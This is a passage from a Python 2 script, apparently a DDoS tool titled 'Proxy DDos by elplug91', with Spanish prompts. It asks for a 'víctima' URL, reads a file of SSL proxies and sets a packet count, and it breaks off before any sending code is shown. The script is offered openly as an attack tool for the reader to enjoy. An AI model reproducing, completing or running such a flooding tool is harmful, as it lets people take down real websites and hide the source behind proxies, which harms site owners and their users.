...
#Script
print("        .----. ( Proxy DDos by elplug91 ) .----.        ")                           
print("»-------:.Para esta herramienta necesitarás un archivo de texto con proxys ssl.:-------»")
print(">----------------------Disfrútalo :)----------------------<")
 
#Victima
url = raw_input("Dirección de la víctima(http://www.google.com): ")
host_url = url.replace("http://", "").replace("https://", "").split('/')[0]
 
#Proxy
in_file = open(raw_input("Introduce el directorio del archivo de los proxys o carga el predeterminado (sslproxy.txt): "),"r")
proxyf = in_file.read()
in_file.close()
 
listaproxy = proxyf.split('\n')
#Cantidad
thread = input("Cantidad de paquetes (1000): ")
